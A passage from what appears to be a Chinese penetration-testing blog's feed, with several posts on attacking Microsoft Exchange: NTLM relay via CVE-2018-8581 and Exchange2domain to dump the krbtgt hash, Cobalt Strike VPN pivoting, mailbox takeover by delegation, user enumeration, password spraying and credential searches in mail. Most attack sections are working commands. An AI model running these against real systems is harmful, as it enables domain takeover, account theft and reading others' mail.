relaying。利用<code>CVE_2018_8581</code>，我们需要<del>两个端口，<code>445</code>和</del><code>80</code>(80可以是其他端口，用来开启HTTP服务)，但是实际测试的时候，并不顺利，成功添加路由，开启端口转发，开启 socks4a 之后，本地通过proxychains开启一个web server，在内网其他主机请求这个server的时候，并未看到任何请求（可能是姿势不对，成功的师傅还望不吝赐教）。所以通过此方式，也并没达到我期望的效果。</p><h3 id="思路三：通过CS部署VPN"><a href="#思路三：通过CS部署VPN" class="headerlink" title="思路三：通过CS部署VPN"></a>思路三：通过CS部署VPN</h3><p>这个也是我觉得最简单的一种方式，在上面两种思路失败之后，就只能期待试用这种方式来进行了，还好，成功啦~</p><p>Cobaltstrike 的covertvpn的介绍，可以看<a href="https://www.cobaltstrike.com/help-covert-vpn" target="_blank" rel="noopener">这里</a>。</p><p>在获取到一个Becon之后,右键连接-&gt;Pivoting-&gt;Deploy VPN</p><p><img src="/usr/uploads/2019/15485609930800.jpg" alt="-w749"></p><p>之后，选择对应的内网ip</p><p><img src="/usr/uploads/2019/15485610686816.jpg" alt="-w480"></p><p>点击ADD来添加本地网口：</p><p><img src="/usr/uploads/2019/15485611318865.jpg" alt="-w392"></p><p>在这里有多种方式的隧道，可以根据自己的需要选择，默认UDP是开销最小的一种方式。添加以后，点击Deploy则可部署成功。</p><p><img src="/usr/uploads/2019/15485612387475.jpg" alt="-w480"></p><p>之后，在<code>Interfaces</code>中可以看到对应信息：</p><p><img src="/usr/uploads/2019/15485613085983.jpg" alt="-w748"></p><p>之后我们在VPS上配置此网口：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig<span class="built_in"> Interface </span>CIDR</span><br></pre></td></tr></table></figure></p><p>example:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig phear5 <span class="number">10.211</span><span class="number">.55</span><span class="number">.225</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure></p><blockquote><p>前面的ip地址就是要给我们的网口配置的ip地址，相当于在域里面新接入了一台主机</p></blockquote><p>之后，就可以与内网主机进行通信了。</p><p>这种方式我录了一个Demo：</p><div class="video-container"><iframe src="//www.youtube.com/embed/isy-QjJykss" frameborder="0" allowfullscreen></iframe></div><blockquote><p>Tips：部署VPN只需要普通用户权限即可。但是获取当前用户账号密码需要提权。</p></blockquote><h2 id="0x02-如何防御-CVE-2018-8581"><a href="#0x02-如何防御-CVE-2018-8581" class="headerlink" title="0x02 如何防御 CVE_2018_8581"></a>0x02 如何防御 CVE_2018_8581</h2><p>删除域内某用户的<code>DCSync</code>权限，可使用 <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">PowerView</a>。</p><p>具体命令为：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetIdentity <span class="string">"DC=cgdomain,DC=com"</span> -PrincipalIdentity<span class="built_in"> user </span>-Rights DCSync</span><br></pre></td></tr></table></figure></p><blockquote><p>根据自己的实际环境进行修改</p></blockquote><p>修复Exchage权限，可使用 <a href="https://raw.githubusercontent.com/gdedrouas/Exchange-AD-Privesc/master/DomainObject/Fix-DomainObjectDACL.ps1" target="_blank" rel="noopener">Fix-DomainObjectDACL.ps1</a></p><p>具体命令为：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\Fix-DomainObjectDACL<span class="selector-class">.ps1</span> -Fix</span><br></pre></td></tr></table></figure><h2 id="0x03-进一步测试"><a href="#0x03-进一步测试" class="headerlink" title="0x03 进一步测试"></a>0x03 进一步测试</h2><p>经过进一步测试以及对漏洞的原理再次学习，发现其实我们只需要开启一个web服务即可，所以，可以使用任意端口(在impacket中，HTTPRelayServer默认端口为80，<a href="https://github.com/Ridter/Exchange2domain" target="_blank" rel="noopener">Exchange2domain</a>已支持自定义端口)。</p><p>当然，上述 <strong>思路三</strong> 对smbrelay也是非常好用的一种方式。现在补充一下 <strong>思路二</strong> 的具体利用方法。</p><p>由于我们不需要smb Server，所以也不需要向<a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">《Remote NTLM relaying through meterpreter on Windows port 445》</a>中所述对445端口进行转发，我们只需要将web端口转发出来即可。在获取一个meterpreter会话之后，添加路由:<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="keyword">run</span><span class="bash"> post/multi/manage/autoroute</span></span><br></pre></td></tr></table></figure></p><p>之后开启<code>socks4a</code>代理。</p><p><img src="/usr/uploads/2019/15486510674349.jpg" alt="-w1006"></p><p>经过测试，发现msf的<code>portfwd</code>不怎么稳定，所以我选择了使用<a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener"><code>ew</code></a>，当然，也可以使用lcx等其他转发工具。<br>在vps上开启转发：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">☁  lcx  ./ew -s lcx_tran -l <span class="number">8088</span> -f <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -g <span class="number">8044</span></span><br></pre></td></tr></table></figure></p><blockquote><p>监听本地8088端口，并将数据转发到127.0.0.1的8044端口</p></blockquote><p>然后在我们有权限的主机上执行：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\s</span>anfeng<span class="symbol">\D</span>esktop&gt;ew_for_Win.exe -s lcx_tran -l 8044 -f 103.*.*.* -g 8088</span><br></pre></td></tr></table></figure></p><blockquote><p>监听本地8044端口的数据，并将数据转发到103.<em>.</em>.*的8080端口。<code>需要注意的是，有权限的主机监听端口=vps转发端口=Exchange2domain监听端口</code></p></blockquote><p>之后，在vps上配置proxychains，ubuntu上proxychains的配置文件路径为<code>/etc/proxychains.conf</code>。修改代理配置文件，如下：<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="meta"># add proxy here ...</span></span><br><span class="line"><span class="meta"># meanwile</span></span><br><span class="line"><span class="meta"># defaults set to "tor"</span></span><br><span class="line">socks4  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1080</span></span><br></pre></td></tr></table></figure></p><p>之后，我们就可一执行Exchange2domain了：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python Exchange2domain.py -ah proxyip -ap 8044 -u<span class="built_in"> user </span>-p password -d domain -th DCIP ExchangeIP --just-dc-user krbtgt</span><br></pre></td></tr></table></figure></p><blockquote><p>注意监听端口跟上面一致，proxyip为我们有权限的主机的ip地址。</p></blockquote><p>所以，整个攻击过程如下：</p><p><img src="/usr/uploads/2019/15486518696316.jpg" alt="-w1440"></p><p><strong>希望以上对你有帮助。</strong></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ol><li><a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">Remote NTLM relaying through meterpreter on Windows port 445</a></li><li><a href="https://github.com/ropnop/impacket_static_binaries" target="_blank" rel="noopener">impacket_static_binaries</a></li><li><a href="https://www.youtube.com/watch?v=YLwJORPJ5OA" target="_blank" rel="noopener">VPN Pivoting with Cobalt Strike </a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; &lt;img src=&quot;/usr/uploads/2019/15485575598334.jpg&quot; alt=&quot;-w944&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://evi1cg.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="cobaltstrike" scheme="https://evi1cg.github.io/tags/cobaltstrike/"/>
    
      <category term="Exchange" scheme="https://evi1cg.github.io/tags/Exchange/"/>
    
  </entry>
  
  <entry>
    <title>Exchange Privilege Elevation</title>
    <link href="https://evi1cg.github.io/archives/Exchange_Privilege_Elevation.html"/>
    <id>https://evi1cg.github.io/archives/Exchange_Privilege_Elevation.html</id>
    <published>2019-01-23T02:42:23.000Z</published>
    <updated>2019-01-27T11:08:55.387Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/usr/uploads/2019/15483115332981.jpg" alt=""></p><a id="more"></a><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>DC : 10.211.55.200<br>Exchange (2013):  10.211.55.201<br>Attacker: 10.211.55.2</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>得到某域用户；<br>与Exchange服务器可互通，不需要入域；</p><h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p><a href="https://github.com/Ridter/Exchange2domain" target="_blank" rel="noopener">https://github.com/Ridter/Exchange2domain</a></p><h2 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h2><p>获取需要的参数：<br><code>-ah</code>: 自己的监听服务器ip<br> <code>-u</code>: 可登录邮箱的用户名<br> <code>-p</code>:对应该用户的密码<br> <code>-d</code>: 域名<br><code>-th</code>:域控ip地址<br>还有就是Exchange服务器地址，默认使用Exchange的版本号为Exchange2013，其他版本可使用<code>--exchange-version</code> 来指定。</p><p>Example:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Exchange2domain.py -ah <span class="number">10.211</span><span class="number">.55</span><span class="number">.2</span> -u sanfeng -p <span class="number">1</span>qaz@WSX -d cgdomain.com -th <span class="number">10.211</span><span class="number">.55</span><span class="number">.200</span> <span class="number">10.211</span><span class="number">.55</span><span class="number">.201</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15483112318745.jpg" alt=""></p><p>获取到hash以后，可通过pash-the-hash来执行命令:</p><p><img src="/usr/uploads/2019/15483112364703.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://github.com/dirkjanm/privexchange/" target="_blank" rel="noopener">Privexchange</a></li><li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" target="_blank" rel="noopener">Abusing Exchange: One API call away from Domain Admin</a></li><li><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">Impacket</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/usr/uploads/2019/15483115332981.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://evi1cg.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Exchange" scheme="https://evi1cg.github.io/tags/Exchange/"/>
    
  </entry>
  
  <entry>
    <title>Exchange用户伪造(CVE-2018-8581)</title>
    <link href="https://evi1cg.github.io/archives/CVE_2018_8581.html"/>
    <id>https://evi1cg.github.io/archives/CVE_2018_8581.html</id>
    <published>2019-01-23T02:16:28.000Z</published>
    <updated>2019-01-25T00:23:13.791Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>DC : 192.168.31.129<br>Exchange (2013):  192.168.31.129<br>Attacker: 192.168.31.243</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>得到用户: beiguoxia<br>与Exchange服务器可互通，不需要入域。</p><h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p><a href="https://github.com/WyAtu/CVE-2018-8581/" target="_blank" rel="noopener">https://github.com/WyAtu/CVE-2018-8581/</a></p><h2 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h2><p>获取本机地址：<br><img src="/usr/uploads/2019/15482101454358.jpg" alt="-w634&quot;"></p><p>修改脚本内容：</p><p><img src="/usr/uploads/2019/15482103139571.jpg" alt="-w709"></p><blockquote><p>ip为Exchange服务器的ip地址，其他的改成对应的信息,FLAG改为1，增加权限委托。</p></blockquote><p>Exploit：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE<span class="number">-2018</span><span class="number">-8581.</span>py</span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15482104172459.jpg" alt="-w884"></p><p>添加成功以后，打开outlook客户端。使用已经获取的邮箱账号(此处为beiguoxia)登录。<br><img src="/usr/uploads/2019/15482106178792.jpg" alt="-w863"></p><p>依次选择偏好<code>设置-账户-高级-代理</code>，添加附加邮箱：</p><p><img src="/usr/uploads/2019/15482108004971.jpg" alt="-w738"></p><p>此后，可接管被攻击账号的收件箱，查看所有邮件：</p><p><img src="/usr/uploads/2019/15482108650110.jpg" alt="-w1024"></p><p>删除权限委托:</p><p>将脚本中FLAG修改为0，再次执行：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE<span class="number">-2018</span><span class="number">-8581.</span>py</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;DC : 192.168.31.129&lt;br&gt;Exchange (2013):  192.168.31.129&lt;br&gt;Attacker: 1
      
    
    </summary>
    
      <category term="内网渗透" scheme="https://evi1cg.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Exchange" scheme="https://evi1cg.github.io/tags/Exchange/"/>
    
  </entry>
  
  <entry>
    <title>Exchange在渗透测试中的利用</title>
    <link href="https://evi1cg.github.io/archives/Exchange_Hack.html"/>
    <id>https://evi1cg.github.io/archives/Exchange_Hack.html</id>
    <published>2019-01-08T19:45:00.000Z</published>
    <updated>2019-01-23T02:14:20.802Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-Exchange简介"><a href="#0x00-Exchange简介" class="headerlink" title="0x00 Exchange简介"></a>0x00 Exchange简介</h2><p>Windows Exchange Server，是国内外应用非常广泛的邮件服务器，是微软公司的一套电子邮件服务组件。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。所以通常渗透测试过程中也会对其进行攻击尝试。</p><h2 id="0x01-Exchange-Endpoint"><a href="#0x01-Exchange-Endpoint" class="headerlink" title="0x01  Exchange Endpoint"></a>0x01  Exchange Endpoint</h2><p>通常Exchange Server 有以下endpoint，即可访问的连接如下：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/AutoDiscover/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Ecp/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/EWS/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/mapi/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Microsoft-Server-ActiveSync/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/OAB/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/OWA/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/PowerShell/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Rpc/</span></span><br></pre></td></tr></table></figure></p><p>每个endpoint的作用如下：</p><table><thead><tr><th>endpoint</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td>/autodiscover</td><td style="text-align:center">自Exchange Server 2007开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。</td></tr><tr><td>/ecp “Exchange Control Panel”</td><td style="text-align:center">Exchange管理中心，管理员用于管理组织中的Exchange的Web控制台</td></tr><tr><td>/ews “Exchange Web Services”</td><td style="text-align:center">Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互</td></tr><tr><td>/mapi</td><td style="text-align:center">Outlook连接Exchange的默认方式，在2013和2013之后开始使用，2010 sp2同样支持</td></tr><tr><td>/Microsoft-Server-ActiveSync</td><td style="text-align:center">用于移动应用程序访问电子邮件</td></tr><tr><td>/OAB “Offline Address Book”</td><td style="text-align:center">用于为Outlook客户端提供地址簿的副本，减轻Exchange的负担</td></tr><tr><td>/owa “Outlook Web APP”</td><td style="text-align:center">Exchange owa 接口，用于通过web应用程序访问邮件、日历、任务和联系人等</td></tr><tr><td>/powershell</td><td style="text-align:center">用于服务器管理的Exchange管理控制台</td></tr><tr><td>/RPC</td><td style="text-align:center">早期的Outlook还使用称为Outlook Anywhere的RPC交互</td></tr></tbody></table><p>以上endpoint中，常用于暴力破解的有/owa 、/ews、/Microsoft-Server-ActiveSync 及/autodiscover，如owa的暴力破解（passwordspray）：<br>抓取登录包如下：</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010879627.jpg" alt="-w1118"></p><blockquote><p>用户名可尝试使用domain\username、domian.com\username、username</p></blockquote><p>使用某密码进行暴力破解：</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010888182.jpg" alt="-w720"></p><p><code>/Microsoft-Server-ActiveSync</code> 爆破为401认证，需要对用户账号密码进行base64处理:</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010869955.jpg" alt="-w647"></p><blockquote><p><code>YWRtaW46YWRtaW4=</code>  -&gt; <code>admin:admin</code></p></blockquote><p><code>/ews</code>、<code>/rpc</code> 等几个endpoint同样为401认证，账号密码的加密方式为NTLM Authenticate：</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010857355.jpg" alt="-w1264"></p><p>爆破需对账号密码进行处理之后在进行。</p><h2 id="0x02-Get-UserList"><a href="#0x02-Get-UserList" class="headerlink" title="0x02 Get UserList"></a>0x02 Get UserList</h2><h3 id="验证Exchange"><a href="#验证Exchange" class="headerlink" title="验证Exchange"></a>验证Exchange</h3><p>对Exchange的利用首先要确定其是否使用了exchange，关于判断的方式，我知道的方式有:<br>1、<a href="https://github.com/vysec/checkO365" target="_blank" rel="noopener">checkO365</a></p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010831575.jpg" alt="-w682"></p><p>2、owa 登录页面，如：<br><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010837872.jpg" alt=""></p><p>3、特殊域名：<br>访问如下域名<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//autodiscover.domain.com/autodiscover/autodiscover.xml</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//owa.domian/owa/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//mail.domain.com/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//webmail.domain.com/</span></span><br></pre></td></tr></table></figure></p><h3 id="获取用户列表"><a href="#获取用户列表" class="headerlink" title="获取用户列表"></a>获取用户列表</h3><p>之后我们需要获取其至少一个账号的信息，那么就需要取搜集获取某域的用户列表，除了top username进行爆破，还可以使用<a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">theharvester</a>、<a href="https://github.com/Ridter/Mailget" target="_blank" rel="noopener">Mailget</a>等工具进行搜集，另外还有一种通过延时来判断的方式。在<a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noopener">MailSniper</a> 写了这样几种来判断内部域和存在用户的方法：</p><ul><li>Invoke-DomainHarvest</li><li>Invoke-UsernameHarvestOWA</li><li>Invoke-UsernameHarvestEAS</li></ul><p>首先来看Invoke-DomainHarvest，这里通过了几种方式来获取内部域名，构造参数如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Invoke-DomainHarvestOWA</span> <span class="selector-tag">-ExchHostname</span> <span class="selector-tag">domian</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure></p><p>脚本会构造如下url:<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$OWAURL</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/owa/auth.owa"</span>)</span><br><span class="line"><span class="variable">$OWAURL2</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/owa/"</span>)</span><br><span class="line"><span class="variable">$autodiscoverurl</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/autodiscover/autodiscover.xml"</span>)</span><br><span class="line"><span class="variable">$ewsurl</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/EWS/Exchange.asmx"</span>)</span><br></pre></td></tr></table></figure></p><p>在未指定<code>brute</code>的情况下，脚本会先请求<code>autodiscoverurl</code>,若失败，再请求ewsurl，并通过请求头里面的NTLM Authenticate数据来猜测内部域名，如：</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010962270.jpg" alt="-w1276"></p><blockquote><p>需要注意到是，未指定brute的时候需要更改-ExchHostname 为对应的autodiscoverurl及ewsurl</p></blockquote><p>指定brute的情况下，则会使用通过时间延迟的方式来检测域名是否存在，首先会构造一些不存在的域及用户名请求owa，并记录其响应时间，之后使用构造的域字典及随机用户名来请求owa，根据其响应时间的不同来判断域及用户名，在这里有两种brute方式，第一种通过导入域名列表：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt -brute</span><br></pre></td></tr></table></figure></p><p>第二种通过公司名称来猜测：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -CompanyName <span class="string">"bla bla"</span> -OutFile potentially-valid-domains.txt -brute</span><br></pre></td></tr></table></figure></p><p>获取域名之后，可导入用户名进行用户名存在检测：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads <span class="number">1</span> -OutFile owa-valid-users.txt</span><br><span class="line">Invoke-UsernameHarvestEAS -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads <span class="number">1</span> -OutFile eas-valid-users.txt</span><br></pre></td></tr></table></figure></p><blockquote><p>PS : 作者说这个问题提交给微软以后并没有修复，但是实际测试效果并不好，但是没准碰到可以使用的情况也说不定。</p></blockquote><p>当获取到一个用户的账号密码之后，可以通过<code>Get-GlobalAddressList</code>来获取GlobalAddress的用户邮箱地址：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-GlobalAddressList -ExchHostname owaurl -UserName username -Password password</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010924029.jpg" alt="-w1130"></p><h2 id="0x03-Brute-Force"><a href="#0x03-Brute-Force" class="headerlink" title="0x03 Brute Force"></a>0x03 Brute Force</h2><p>在这里暴力破解的地方有很多个，首先可以通过burpsuite对OWA进行暴力破解，另外就是<code>/autodiscover</code>、<code>/ews</code>、<code>/Microsoft-Server-ActiveSync</code> 等几个endpoint，可利用的工具如：<a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noopener">MailSniper</a>、<a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">Ruler</a>、<a href="https://github.com/byt3bl33d3r/SprayingToolkit" target="_blank" rel="noopener">SprayingToolkit</a>，可根据个人喜好取舍。为了防止账号因多次登陆失败触发告警或账户被封禁，建议使用同密码爆破用户名的方式进行暴力破解。下面介绍一下MailSniper的相关方法的使用。</p><p><strong>通过owa爆破：</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\MailSniper.ps1</span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010982186.jpg" alt="-w960"></p><p><strong>通过ews爆破：</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010993800.jpg" alt="-w964"></p><p><strong>通过Microsoft-Server-ActiveSync爆破：</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayEAS -ExchHostname MSAHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010925301.jpg" alt="-w898"></p><p><strong>通过autodiscover 爆破：</strong><br>在MailSniper中没有写对autodiscover的爆破，可以选择使用burp、ruler或者SprayingToolkit。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python atomizer.py owa autodiscoverhost password user.txt</span><br></pre></td></tr></table></figure><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010998743.jpg" alt="-w747"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ruler --domain autodiscoverhost -k brute --users user.txt --passwords pass.txt --delay 0 --threads 10 -v</span><br></pre></td></tr></table></figure><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010951921.jpg" alt="-w877"></p><h2 id="0x04-Search-mail"><a href="#0x04-Search-mail" class="headerlink" title="0x04 Search mail"></a>0x04 Search mail</h2><p>在获取到某用户邮箱账号密码以后，我们可以对其邮件内容进行搜索，除了直接登录邮件外，也可以使用Exchange的接口进行邮件的检索，其接口的相关开发可以参考《<a href="https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS" target="_blank" rel="noopener">Exchange Web Service(EWS)开发指南</a>%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/)》，在外网情况下，可使用此工具来列出邮件内容。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewshost/ews/Exchange.asmx -Mode ListMail -Folder Inbox</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010921519.jpg" alt="-w959"></p><p>搜索某字符串：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewhost/ews/Exchange.asmx -Mode SearchMail -String vpn</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010976996.jpg" alt="-w1439"></p><p>或者使用MailSniper的Invoke-SelfSearch添加<code>-remote</code> 参数，输入账号密码即可。使用接口可以<code>bypass一些owa的2FA</code>。</p><p>内网情况下可使用MailSniper来快速检索，如使用xiaoming\domain用户登录某主机，可在该主机上搜索xiaoming的邮箱（不需要密码）<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SelfSearch -Mailbox user@domain.com -Terms *pass* -Folder all -ExchangeVersion Exchange2013_SP1 -OutputCsv <span class="number">1</span>.csv</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010993350.jpg" alt="-w841"></p><p>如果获得了域管理员的密码，可以检索任意邮件的内容：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-GlobalMailSearch -ImpersonationAccount beiguoxia -ExchHostname Exchangehostname -AdminUserName domain\administrator  -AdminPassword password -Term <span class="string">"*pass*"</span> -Folder all</span><br></pre></td></tr></table></figure><p><img 